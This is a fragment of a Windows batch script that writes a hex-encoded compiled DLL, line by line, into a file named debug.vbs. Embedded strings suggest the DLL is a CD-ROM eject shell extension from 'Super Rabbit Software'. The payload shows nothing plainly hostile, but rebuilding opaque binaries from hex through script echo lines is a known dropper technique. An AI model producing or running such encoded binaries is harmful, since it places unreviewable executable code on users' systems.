@echo +"07000000D41E0011070000008C1E0011070000004C1E001107000000F81D001107000000A41D001107000000601D001107000000101D0011010002009418001100000000FFFFFFFFFFFFFFFF0000000048190011244000110C000000D8A917001700200000000000CC251700F0120011582200113C1000114210001198200011"_>>debug.vbs
@echo +"B8210011FC2100117C210011382200117C13001170130011902000112A10001130100011682200113C21001174220011FC2000118C2200119C220011F02200111C230011EC1F0011AC200011BA682B0011B94E100011FFE1BA582F0011B94E100011FFE1BA6C280011B94E100011FFE1BAD0300011B94E100011FFE1BA782700"_>>debug.vbs
@echo +"11B94E100011FFE1F401000094180011000000007037001180370011D80400000040001148100011000000002A005C00410045003A005C004300570049004E005C005000570069006E005C006F006B005C004300440045006A006500630074005C0043006F006E0074006500780074004D0065006E0075002E00760062007000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000003012001111000000010000009418001100000000F4240011FFFFFFFF00000000E81800110040001108000000D82F19002000200000000000A45618003C16001101000000"_>>debug.vbs
@echo +"AC1A001100000000BC16001101000000C416001100000000C016001103000000C41600110E0000000C0010003C17001170440011000000000CD41700381B0011201D0011A0110011941100111C400011C01F0011061000110C100011D01F0011701D00111210001118100011081E00111E1000115C1E0011B41D00110C200011"_>>debug.vbs
@echo +"681A0011382000118820001190200011241000115C1F00112A100011201F0011CC1A0011501A00119820001164130011301000113610001158130011BC1A0011CC1A00114000020038000000DC1A0011FFFFFFFF00000000000000007417001128931800EC1A0011FFFFFFFF5200030040000000381B0011FFFFFFFF03000400"_>>debug.vbs
@echo +"94170011AC17001138931800481B0011FFFFFFFF5200010048000000CC1B0011FFFFFFFF01000400D0170011D817001148931800DC1B0011FFFFFFFF000000000000000000000000000000000000000000000000FB1700110F18001123180011371800114B1800115F180011731800118718001100000000C4160011C4150011"_>>debug.vbs
@echo +"541000115A10001160100011F41700110818001100000160020003600200016005000360010001600600036000000000EC160011C415001154100011661000116C1000111C1800116C1800115818001100000160030003600000000014170011C415001154100011661000116C10001130180011B838000000663D33C0BA4826"_>>debug.vbs
@echo +"00116872100011C3B838000000663D33C0BACC2500116872100011C3B840000000663D33C0BAC42400116872100011C3B848000000663D33C0BA003700116872100011C3B800000000663D33C0BA382900116872100011C3B840000000663D33C0BAA83400116872100011C3B840000000663D33C0BAAC3200116872100011C3"_>>debug.vbs
@echo +"B800000000663D33C0BAB42C00116872100011C3000000004440001184290011FFFFFFFF0000000034400011F9D3DB81300D0747B05F1CB050B59E410E00030004000300E81800110000000000000000000000009C19001109040000040800000000000002000000C4150011FFFFFFFF9C1C0011000000000000000000000000"_>>debug.vbs
@echo +"A81900110800000078190011FFFF000003880100000000004C110011FFFFFFFFB41F0011000000001C40001100000000B01900110C00000000000000FFFF00000180010000000000B8120011FFFFFFFFB41F0011000000002C40001100000000BC1900110C00000000000000FFFF00000180010000000000EC1B0011001C0011"_>>debug.vbs
@echo +"101C0011301C0011000000004C1C00116C1C001108000800000000004344524F4D456A6563740000634D656E750000006D6F64436F6E746578740000696F6374726C0000120000004E006500770046006F006C0064006500720000001000000056006900650077004C0069007300740000000000160000005600690065007700"_>>debug.vbs
@echo +"440065007400610069006C007300000036000000530075007000650072005200610062006200690074004300440052004F004D0045006A006500630074002E0063004D0065006E0075000000120000007351ED95280026004300290020004951719A000030000000530075007000650072002000520061006200620069007400"_>>debug.vbs
@echo +"20004300440052004F004D00200045006A00650063007400000000002B3DFBFCFAA06810A73808002B3371B5439947F01DAADD4986F46035E068260C2A3DFBFCFAA06810A73808002B3371B56FC8C97CC07BC342BDF718EE7DDCFEEE213DFBFCFAA06810A73808002B3371B5436C61737300000050F0156776F0CD119B330800"_>>debug.vbs
@echo +"2B336F145642496E7465726E616C0000F41A001100000000040000000900000000000000041B001190430011000000000000000070CB1700E414020000000000C00000000000004649436F6E746578744D656E7500000000ACF47400D95BD0EE7DAACF11897500AA453A5C4357494E5C5057696E5C6F6B5C4344456A6563745C"_>>debug.vbs
@echo +"496374784D656E752E746C620000000049436F6E746578744D656E755F544C4200000000581B0011000000000100000000000000681B0011901B001194430011000000000000000070CB1700E814020000000000C000000000000046495368656C6C457874496E6974000000436C6173735F496E697469616C697A6500000000"_>>debug.vbs
@echo +"436C6173735F5465726D696E6174650049436F6E746578744D656E755F5175657279436F6E746578744D656E75000000495368656C6C457874496E69745F496E697469616C697A650000000049436F6E746578744D656E755F476574436F6D6D616E64537472696E6700000049436F6E746578744D656E755F496E766F6B6543"_>>debug.vbs
@echo +"6F6D6D616E6400000E00000047657456657273696F6E457841000000260054000000050000000000340005010D00000001003C000300440003003C00030044000300000010000C00000001000C00040C080003000C00140000000000140004040C0024000000000024000404090000006B65726E656C3332000000000E000000"_>>debug.vbs
@echo +"52746C4D6F76654D656D6F7279000000F01C0011001D00110000040098430011A1A04300110BC07402FFE068101D0011B800100011FFD0FFE00000000C0000007368656C6C33322E646C6C000F00000044726167517565727946696C65410000401D0011501D001100000400A4430011A1AC4300110BC07402FFE068601D0011"_>>debug.vbs
@echo +"B800100011FFD0FFE00000001200000047657453686F7274506174684E616D6541000000F01C0011901D001100000400B0430011A1B84300110BC07402FFE068A41D0011B800100011FFD0FFE00000000A0000006F6C6533322E646C6C0000001100000052656C656173655374674D656469756D00000000D41D0011E41D0011"_>>debug.vbs
@echo +"00000400BC430011A1C44300110BC07402FFE068F81D0011B800100011FFD0FFE00000000900000061647661706933320000000011000000526567517565727956616C756545784100000000281E0011381E001100000400C8430011A1D04300110BC07402FFE0684C1E0011B800100011FFD0FFE00000000F00000056697274"_>>debug.vbs
@echo +"75616C50726F746563740000F01C00117C1E001100000400D4430011A1DC4300110BC07402FFE0688C1E0011B800100011FFD0FFE00000000700000075736572333200000C000000496E736572744D656E754100BC1E0011C81E001100000400E0430011A1E84300110BC07402FFE068D41E0011B800100011FFD0FFE0000000"_>>debug.vbs
@echo +"090000006C7374726370794100000000F01C0011041F001100000400EC430011A1F44300110BC07402FFE068101F0011B800100011FFD0FFE0000000090000006C7374726C656E4100000000F01C0011401F001100000400F8430011A1004400110BC07402FFE0684C1F0011B800100011FFD0FFE00000000C0000004D657373"_>>debug.vbs
@echo +"616765426F784100BC1E00117C1F00110000040004440011A10C4400110BC07402FFE068881F0011B800100011FFD0FFE00000000C00080000000000000000000E01000000000000C000000000000046B866C4A49F491B10BB7800AA00383CBB564241352E444C4C0000000016001401000001009400043414000A202B301400"_>>debug.vbs
@echo +"80000000000000002600000028004700430053005F00560045005200420029004D0045004E0055004900540045004D00310000004800000028004700430053005F00560041004C004900440041005400450029004E006500770020006D0065006E00750020006900740065006D0020006E0075006D0062006500720020003100"_>>debug.vbs
@echo +"0000000002000000000000000000000000000000020000003A000000F01C00118C1C00110000040010440011A1184400110BC07402FFE0689C200011B800100011FFD0FFE00000000A00000077696E6D6D2E646C6C0000000F0000006D636953656E64537472696E67410000CC200011DC200011000004001C440011A1244400"_>>debug.vbs
@echo +"110BC07402FFE068EC200011B800100011FFD0FFE00000000E00000047657444726976655479706541000000F01C00111C2100110000040028440011A1304400110BC07402FFE0682C210011B800100011FFD0FFE000000010000000446576696365496F436F6E74726F6C00F01C00115C2100110000040034440011A13C4400"_>>debug.vbs
@echo +"110BC07402FFE0686C210011B800100011FFD0FFE00000000C00000043726561746546696C654100F01C00119C2100110000040040440011A1484400110BC07402FFE068A8210011B800100011FFD0FFE000000011000000466C75736846696C654275666665727300000000F01C0011D8210011000004004C440011A1544400"_>>debug.vbs
@echo +"110BC07402FFE068EC210011B800100011FFD0FFE00000000C000000436C6F736548616E646C6500F01C00111C2200110000040058440011A1604400110BC07402FFE06828220011B800100011FFD0FFE0000000080000005C005C002E005C0000000000040000003A005C00000000001200000063006C006F00730065002000"_>>debug.vbs
@echo +"61006C006C0000000A0000006F00700065006E00200000004C0000005C002000740079007000650020006300640061007500640069006F00200061006C0069006100730020006300640020007700610069007400200073006800610072006500610062006C006500000000002400000073006500740020006300640020006400"_>>debug.vbs
@echo +"6F006F007200200063006C006F00730065006400000000001000000063006C006F007300650020006300640000000000682A0011F4240011FFFFFFFFFFFFFFFF00000000A023001180230011242A0011302A0011382A0011442A00111C2A00114C2A0011582A0011602A0011F0290011F8290011042A0011102A00111C2A0011"_>>debug.vbs
@echo +"E029001100000000FFFFFFFFFFFFFFFF0200FFFFFFFFFFFF1C000000C4290011D029001100000000FFFFFFFFFFFFFFFF0200FFFFFFFFFFFF1C000000B82900112824001104240011702400114C2400110000000098240011E02300110000000004004C0010000000000000000600036030230011000000000000000000000000"_>>debug.vbs
@echo +"1E08000000003800100000000000000001000360302300110000000000000000000000001E000000000034000C0000000000000000000360302300110000000000000000000000001E0000000C0040000C00000000000000030003604C2300110000000000000000000000001E08080814003C000C0000000000000002000360"_>>debug.vbs
@echo +"6C2300110000000000000000000000001E0808080808000014004800140000000000000005000360582300110000000000000000000000001E0808080808000013000000C415001118000000040024002000000000000000000000000C00000000000000000000000C000000000000000000000000000000C4150011FFFFFFFF"_>>debug.vbs
@echo +"000000000300000000000000C02300110000000040230011302300113023001100000000000000000000000054000000040100005868AC11001168D044001168D444001150E92EEBFFFF5868AC11001168D044001168D444001150E91EEBFFFF5868AC11001168D044001168D444001150E90EEBFFFF5868AC11001150E908EB"_>>debug.vbs
@echo +"FFFF0000F500000000F500000000080800063400FE8E0100FFFF040000016C08003D00001974FFF5040000000474FF0478FF0A01000C003C760400F4042B72FF0478FF5E03000C007B040013C415001104000C004800280000000000000000000000000010000000000001000000000074FF03000C0000000000000000000000"_>>debug.vbs
@echo +"F500000000F500000000080800063400FE8E0100FFFF040000016C08003D00001974FFF5040000000474FF0478FF0A01000C003C050200F4042B72FF0478FF5E03000C007B040013C415001104000C004800280020000000000000000000000010000000000001000000000074FF03000C0000000000000000000000F5040000"_>>debug.vbs
@echo +"00800C000470FF0A00000C003C6C70FF7F1000F401ADF404B1E7AA716CFFF5040000006C6CFF0474FF0A00000C003C0468FFF540000000F5040000006C6CFF0A010010003CF5040000000414006C6CFF0A00000C003C0468FF6C68FFF5040000006C6CFF0A010010003C6C74FF7178FF14FFFFFF4C1100111000140078002400"_>>debug.vbs
@echo +"0000000000000000000000000C00000000000000000000000C0000000000000000000000F400E77178FFF5940000007160FE0460FE04CCFD1F150004CCFD5E1600040071C8FD3C04CCFD0460FE2015006CC8FD7174FF6C74FFF500000000CC1C50006C70FEF502000000C71C5000F4FFE77178FF14FFFFFFB81200110400B401"_>>debug.vbs
@echo +"54005C00000000000000000000000000440000000000020000000010CCFD49300000FFFFEC1F0011616E646C0000000000000000FFFFFFFF60FE49201301FFFFEC1F0011FFFFFFFF69616C69A0E7190028E319000C00000000000000000000001B0A00FD310C00F5410000000478FFF55A000000FE646CFF8B006C78FF0B0B00"_>>debug.vbs
@echo +"04002368FF0B0C0004002364FF1B0D002A2360FF045CFF346C5CFF5E0E0004007158FF3C6C58FF7174FF32080068FF64FF60FF5CFF6C74FFF505000000C71C8300800C006C78FF0B0B0004002368FF0B0C0004002364FF2AFD270C0032040068FF64FF0478FF666CFF1A0014B8120011080024008C0024000000000000000000"_>>debug.vbs
@echo +"000000000C00000000000000000000001C000000000004000000000068FF010064FF010060FF01005CFF01006C0C004374FFFF2D284CFF0000F5F4010000043CFF0A0A000C00043CFF60316CFF3604004CFF3CFF6C6CFF4A6C6CFF0434FF346C34FF6C74FF0438FF346C38FF5E0F000C007130FF3C6C38FF0474FFFC586C34FF"_>>debug.vbs
@echo +"046CFFFC586C30FF7170FF32040038FF34FF6C70FFF500000000DB1C80006C70FF6C6CFF0B0B000800316CFF6C6CFF4378FFFF2F10000400C41500110C004C008C00300000000000000000000000000018000000000003000000000178FF010074FF01006CFF01001C000000000004000000000038FF010034FF01004CFF0200"_>>debug.vbs
@echo +"3CFF02000000000094180011FFFFFFFF0000000034230011000000000000000000000000FFFFFFFF00000000101B0011DC1A001164440011A41B0011381B001168440011A41B0011CC1B00116C44001149436F6E746578744D656E7500000000495368656C6C457874496E6974000000684D656E75000000696E6465784D656E"_>>debug.vbs
@echo +"750000006964436D64466972737400006964436D644C61737400000075466C61677300007069646C466F6C64657200006C70646F626A0000684B657950726F67494400006964436D6400000070775265736572766564000070737A4E616D65006363684D617800006C70636D690000003A0CFF0000283CFF0100F5010000006C"_>>debug.vbs
@echo +"0C004D5CFF0840042CFF0A01001000042CFF041CFF0A02000800041CFFFBEFFCFE3AECFE0300FBEFDCFE60316CFF360A003CFF2CFF1CFFFCFEDCFEF500000000F500000080F503000000F500000000F503000000F5000000C06C6CFF04D8FE346CD8FE5E04001C0071D4FE3C6CD8FE046CFFFC586CD4FE7174FF2FD8FE6C74FF"_>>debug.vbs
@echo +"F5FFFFFFFFC71C9F00F400707AFF156C74FF0A050004003CF5000000000470FFF500000000F500000000F500000000F500000000F508482D006C74FF5E0600200071D4FE3C6CD4FEF500000000C71CE900F400707AFF1EEE00F4FF707AFF6C74FF0A070004003C15B81200110800A800F8002800000000000000000000000000"_>>debug.vbs
@echo +"1000000000000100000000006CFF0100240000000000060000000000D8FE01003CFF02002CFF02001CFF0200FCFE0200DCFE02004BFC000808008A3400F401FCCBF500000000C71C19001EFC00F501000000F5010000000808008A34009E1B1B00F500000000FEFDF500000000DB1CFC000468FF0A1C000400F5010000000808"_>>debug.vbs
@echo +"008A34009E0B1D000400315CFFF5010000003E5CFF2364FF0B0B0008002360FF0B1E0004003170FF32060064FF60FF5CFFF5010000006C68FF6C70FFF500000000FEFDF500000000DB1C9B001EDE006C68FF1B1400FB3D1CD8006C68FF0B1D000400315CFFF5010000003E5CFF2364FF0B0B0008002360FF0B1E0004003170FF"_>>debug.vbs
@echo +"32060064FF60FF5CFF1EDE001B14004370FF6C70FF1B1400FB3D1CFC006C70FF1B1B002AFDC764FF0A1F0004002F64FF13FFFFFFC41500110800200000013000000000000000F9020000000018000000000003000000000068FF010070FF010078FF010018000000000003000000000064FF010060FF01005CFF01006C0C00FC"_>>debug.vbs
@echo +"F874FF6C1800716CFFF4FF7062FF6C2000F50F000000C4F500000000C71C2D001B02004364FF1E82006C2000F502000000C4F502000000C71C48001B02004364FF1E82006C2000F504000000C4F504000000C71C63001B02004364FF1E82006C2000F501000000C4F501000000C71C7D00F4007062FF1E8200F4007062FF6B62"_>>debug.vbs
@echo +"FF1CFD006C64FF0458FF346C58FF6C6CFFF5000400006C14006C10000A030014003C6C58FF0464FFFC582F58FF6C1400F501000000AA7114006C6CFFF501000000AA716CFFF500000000F500000000F5000C00006C14006C10000A030014003C6C1400F501000000AA7114006C6CFF6C1800AE7178FF1E0501F5000000007178"_>>debug.vbs
@echo +"FF14FFFF4C1100111C002400080134000000000000000000000000001C000000000004000000000068FF010064FF01005CFF010074FF030010000000000001000000000058FF01005E08000000F400E7C71C15006C0C000A09000400153A0CFF0000283CFF0100F5010000006C0C004D5CFF0840042CFF0A01001000042CFF04"_>>debug.vbs
@echo +"1CFF0A02000800041CFFFBEFFCFE3AECFE0300FBEFDCFE60316CFF360A003CFF2CFF1CFFFCFEDCFEF500000000F500000080F503000000F500000000F503000000F5000000C06C6CFF04D8FE346CD8FE5E04001C0071D4FE3C6CD8FE046CFFFC586CD4FE7174FF2FD8FE6C74FFF5FFFFFFFFC71CB400F400707AFF156C74FF0A"_>>debug.vbs
@echo +"050004003CF5000000000470FFF500000000F500000000F500000000F500000000F50C482D006C74FF5E0600200071D4FE3C6CD4FEF500000000C71CFE00F400707AFF1E0301F4FF707AFF6C74FF0A070004003C15E31900B81200110800A800100128000000000000000000000000001000000000000100000000006CFF0100"_>>debug.vbs
@echo +"240000000000060000000000D8FE01003CFF02002CFF02001CFF0200FCFE0200DCFE0200F500000000F500000000F5000000001B0F00042CFF346C2CFF5E100010007128FF3C6C28FFFD6918FFFCF66CFF2F2CFFF500000000F500000000F5000000001B1100800C002A232CFF1B12002A2314FF0410FF346C10FF5E10001000"_>>debug.vbs
@echo +"7128FF3C6C28FFFD6918FFFCF66CFF3206002CFF14FF10FFF500000000F57F0000000430FF331E002314FF0410FF346C10FF1B1300042CFF346C2CFF5E100010007128FF3C6C10FF040CFFFC586C0CFF0430FF471E006C28FFFD6918FFFCF66CFF3208002CFF14FF10FF0CFFF500000000F500000000F5000000001B1400042C"_>>debug.vbs
@echo +"FF346C2CFF5E100010007128FF3C6C28FFFD6918FFFCF66CFF2F2CFFF500000000F500000000F5000000001B0F00042CFF346C2CFF5E100010007128FF3C6C28FFFD6918FFFCF66CFF2F2CFF14000000B8120011080070002C0128000000000000000000000000001000000000000100000000006CFF02001C00000000000400"_>>debug.vbs
@echo +"000000002CFF010014FF010010FF01000CFF0100F5240000006C0C000454FF0A01000C003C6C68FF5E160004007140FF3CF5000000000B170004004630FF6C40FF0420FF0A0A000C000420FF603150FF36040030FF20FF6C68FF6C50FF041CFF346C1CFF0A180008003C6C1CFF0450FFFC582F1CFF6C64FF5E160004007140FF"_>>debug.vbs
@echo +"3CF5000000000B170004004630FF6C40FF0420FF0A0A000C000420FF60314CFF36040030FF20FF6C64FF5E160004007140FF3C6C40FF7144FF6C44FFF500000000DB1CE100F5000000006C44FF0418FFFE8E0100FFFF010000006C44FF6C64FFF5000000006C18FF2E14FF400A01000C003C2D14FF6C64FF6C4CFF041CFF346C"_>>debug.vbs
@echo +"1CFF0A180008003C6C1CFF044CFFFC582F1CFF6C60FFF50000FFFFC4F500000000C71C34016C60FF7178FF6C78FF7110FF6C10FFF500000000C71C31016C5CFF10500019001E97016C60FF5E160004007140FF3CF5000000000B170004004630FF6C40FF0420FF0A0A000C000420FF603148FF36040030FF20FF6C60FF6C48FF"_>>debug.vbs
@echo +"041CFF346C1CFF0A180008003C6C1CFF0448FFFC582F1CFF6C48FF1B1A00FB301C97016C5CFF105000190013C415001108006C0098013C002000000000000000000000002200000000000400000000004CFF010018FF05010300FFFF000048FF010050FF0100C2021C000000000004000000000014FF06001CFF010030FF0200"_>>debug.vbs
@echo +"20FF02006C10007168FF6C68FFF500000000C71D1E006C68FFF504000000C71C39006C0C007164FF6C64FFF500000000C71C36001B10004370FF1E9C006C68FFF501000000C71D51006C68FFF505000000C71C6C006C0C007160FF6C60FFF500000000C71C69001B11004370FF1E9C006C68FFF502000000C71D84006C68FFF5"_>>debug.vbs
@echo +"06000000C71C9C006C0C00715CFF6C5CFFF500000000C71C9C001B12004370FF6C1C00F501000000AE6C70FF0B0B0008002358FF1B13002A3170FF2F58FF6C10007154FF6C54FFF500000000C71DE4006C54FFF501000000C71DE4006C54FFF502000000C71C3E016C70FF1B1400FB3D1C3B01F5800000000470FF4D44FF0840"_>>debug.vbs
@echo +"0434FF0A15000C000434FFFC6030FF0430FF0478FFFF013534FF6C78FFF401FCCBF501000000AAF5000000006C78FF2E2CFF406C18000A01000C003C2D2CFF1EA1016C54FFF504000000C71D62016C54FFF505000000C71D62016C54FFF506000000C71CA1016C70FF1B1400FB3D1CA1016C70FFFC5F30FF0430FF0478FFFF01"_>>debug.vbs
@echo +"6C78FFF401FCCBF501000000AAF5000000006C78FF2E2CFF406C18000A01000C003C2D2CFF130000C415001118005000A40138002000000000000000000000001E00000000000300000000006CFF010070FF010078FF050100000000000000002200000000000400000000002CFF060058FF010034FF020030FF050100000000"_>>debug.vbs
@echo +"00000000F5040000000410000474FF0A01000C003C6C74FF3D05001970FFF504000000F500000000593CFF0474FF0A01000C003C045CFF7138FFF50F0000009938FF0000F5000000009938FF0400F5010000009938FF0800F5FFFFFFFF9938FF0C00F5010000009938FF1000F5000000007138FF045CFF5E06000400713CFF04"_>>debug.vbs
@echo +"50FF5E060004006C3CFF0870FF0D0C000500043CFF0B070000001934FF0834FF0D4C0008006C3CFF7140FF1A34FFF500000000F500000000F5FFFFFFFF6C54FF5E09001000713CFF3C6C3CFF7144FFF5000000000448FF6C44FFF501000000AEFE642CFF8B01280CFF0000F5F401000004FCFE0A0A000C0004FCFE60314CFF36"_>>debug.vbs
@echo +"04000CFFFCFE6C4CFF4A6C4CFF04F8FE346CF8FE6C48FF6C54FF5E09001000713CFF3C6CF8FE044CFFFC586C3CFF7140FF2FF8FE6C40FFF500000000DB1C83016C40FF6C4CFF0B0B000800314CFFF5000000000808008A3400F401FCCBF501000000AA080800063400FE8F0100FFFF040000016C4CFF0808008A3400F401FCCB"_>>debug.vbs
@echo +"0808008A34003B0448FF662CFFE2000450FF5E0C000400713CFF3C6C3CFF7140FFFC633D05001970FF280CFF0000F5000200000B0D0008003178FF350CFF6C78FF4A59F4FE6C78FF04F8FE346CF8FEF501000000593CFFF500000000F5000000006C14005E0E00180071F0FE3C6CF8FE0478FFFC586CF0FE7140FF2FF8FE1300"_>>debug.vbs
@echo +"C415001110008C00FC01500020000000000000000000000038000000000005000000000074FF030078FF01004CFF010050FF290000800800C41C0011F010000000800800300000001811000070FF03001C0000000000040000000000F8FE010034FF03000CFF0200FCFE0200CCCCCCCCE9E9E9E9CCCCCCCCCCCCCCCCCCCCCCCC"_>>debug.vbs
@echo +"9E9E9E9ECCCCCCCCCCCCCCCCCCCCCCCC000000008ADB1E3C00000000E0370000010000000400000004000000B8370000C8370000D8370000762500004A2500006025000034250000E9370000F93700000B3800001D3800000000010002000300737263642E646C6C00446C6C43616E556E6C6F61644E6F7700446C6C47657443"_>>debug.vbs
@echo +"6C6173734F626A65637400446C6C526567697374657253657276657200446C6C556E72656769737465725365727665720000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"28500000FFFFFFFFFFFFFFFFF8500000905000000000000000000000000000000000000000000000065100006E0200800702008018510000780200802E5100000F0200801002008042510000545100006A510000865100005E0200805F0200809C5100001902008084020080AE510000AD020080650000806600008067000080"_>>debug.vbs
@echo +"68000080690000806802008000000000FC2F38762C0A3676F02229761FFB34766E302C769D292A768EF83576B3F83576E0F32C76D17F2B764A632B76592B2A7633EC2C76F6EB2C7684023876E6BC2976C34A3576FFFA347607D628765DA62B7643A82D7623F133767D132B767D022C7678232976000000004D535642564D3530"_>>debug.vbs
@echo +"2E444C4C000000004D65746843616C6C456E67696E65000000004556454E545F53494E4B325F52656C656173650000004556454E545F53494E4B5F416464526566000000446C6C46756E6374696F6E43616C6C0000004556454E545F53494E4B5F52656C65617365000000004556454E545F53494E4B5F5175657279496E7465"_>>debug.vbs
@echo +"72666163650000005F5F76626145786365707448616E646C65720000000050726F6343616C6C456E67696E65000000004556454E545F53494E4B325F4164645265660000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"000000008ABC1F3C2400010002000100E800008058000080F8000080400000801000000028000080000000008ABC1F3C24000100000001000100000070000080000000008ABC1F3C24000100000001000100000088000080000000008ABC1F3C240001000000010001000000A0000080000000008ABC1F3C2400010000000100"_>>debug.vbs
@echo +"04080000B8000000000000008ABC1F3C240001000000010000000000C8000000000000008ABC1F3C240001000000010000000000D800000010610000E8020000B004000000000000F863000014000000B0040000000000000C64000020060000B004000000000000070054005900500045004C00490042000A005F0049004900"_>>debug.vbs
@echo +"44005F0043004D0045004E0055000000E80234000000560053005F00560045005200530049004F004E005F0049004E0046004F0000000000BD04EFFE000001000100010000000000010001000000000000000000000000000400000002000000000000000000000000000000440000000000560061007200460069006C006500"_>>debug.vbs
@echo +"49006E0066006F00000000002400040000005400720061006E0073006C006100740069006F006E00000000000408B00448020000010053007400720069006E006700460069006C00650049006E0066006F0000002402000001003000380030003400300034004200300000004C002C00010043006F006D00700061006E007900"_>>debug.vbs
@echo +"4E0061006D00650000000000530075007000650072002000520061006200620069007400200053006F0066007400770061007200650000003800120001004C006500670061006C0043006F007000790072006900670068007400000043006100690020005800750061006E000000000044001A0001004C006500670061006C00"_>>debug.vbs
@echo +"540072006100640065006D00610072006B0073000000000053007500700065007200200052006100620062006900740000000000540032000100500072006F0064007500630074004E0061006D0065000000000053007500700065007200200052006100620062006900740020004300440052004F004D00200045006A006500"_>>debug.vbs
@echo +"63007400000000002C000A000100460069006C006500560065007200730069006F006E000000000031002E00300031000000000030000A000100500072006F006400750063007400560065007200730069006F006E00000031002E0030003100000000002C000A00010049006E007400650072006E0061006C004E0061006D00"_>>debug.vbs
@echo +"650000007300720063006400000000003C00120001004F0072006900670069006E0061006C00460069006C0065006E0061006D006500000073007200630064002E0064006C006C00000000002C00020001004F004C004500530065006C006600520065006700690073007400650072000000000000000000100000006FC8C97C"_>>debug.vbs
@echo +"C07BC342BDF718EE7DDCFEEE4D5346540200010000000000090400000000000041000000020000000000000002000000FFFFFFFF0000000000000000030000001500000000000000FFFFFFFFFFFFFFFF2000000080000000010000000300000000000000640000004C010000C8000000FFFFFFFF0F0000008403000024000000"_>>debug.vbs
@echo +"FFFFFFFF0F000000A803000038000000FFFFFFFF0F0000005403000030000000FFFFFFFF0F0000001402000080000000FFFFFFFF0F00000094020000C0000000FFFFFFFF0F000000E003000000020000FFFFFFFF0F000000E005000040000000FFFFFFFF0F000000FFFFFFFF00000000FFFFFFFF0F000000FFFFFFFF00000000"_>>debug.vbs
@echo +"FFFFFFFF0F000000FFFFFFFF00000000FFFFFFFF0F000000FFFFFFFF00000000FFFFFFFF0F000000FFFFFFFF00000000FFFFFFFF0F000000FFFFFFFF00000000FFFFFFFF0F000000FFFFFFFF00000000FFFFFFFF0F000000342100002006000000000000FFFFFFFF030000000000000000000000000000000000000000000000"_>>debug.vbs
@echo +"0000000060000000D01100001800000001000000FFFFFFFF0000000000000000FFFFFFFF01001C0004000000010000000200070000000000FFFFFFFF252101002006000000000000FFFFFFFF0300000000000000000000000000000000000000000000000000000018000000020000002C00000001000000FFFFFFFF00000000"_>>debug.vbs
@echo +"00000000FFFFFFFF0300000004000000000000000000000000000000FFFFFFFFFFFFFFFFFFFFFFFF480000006000000018000000FFFFFFFF90000000FFFFFFFFFFFFFFFFFFFFFFFFA8000000FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF30000000FFFFFFFFFFFFFFFF00000000FFFFFFFFFFFFFFFF"_>>debug.vbs
@echo +"FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF89D3FA873D5D4A4396E0492F0FFE018CFEFFFFFFFFFFFFFF439947F01DAADD4986F46035E068260C64000000FFFFFFFF3004020000000000C00000000000004602000000FFFFFFFF0004020000000000C00000000000004601000000FFFFFFFF"_>>debug.vbs
@echo +"6FC8C97CC07BC342BDF718EE7DDCFEEE00000000FFFFFFFFACF47400D95BD0EE7DAACF11897500AA1E000000FFFFFFFFE414020000000000C0000000000000460D000000FFFFFFFFE814020000000000C00000000000004619000000780000000000000001000000FFFFFFFF100000000D00000000000000FFFFFFFF20000000"_>>debug.vbs
@echo +"1900000000000000FFFFFFFFFFFFFFFF000001030000000048000000010001031C00000090000000020001031C000000A80000003000000000000000020000002D007374646F6C65322E746C625757577800000000000000010000003100496374784D656E752E746C625757FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"_>>debug.vbs
@echo +"FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"_>>debug.vbs
@echo +"FFFFFFFF00000000FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"_>>debug.vbs
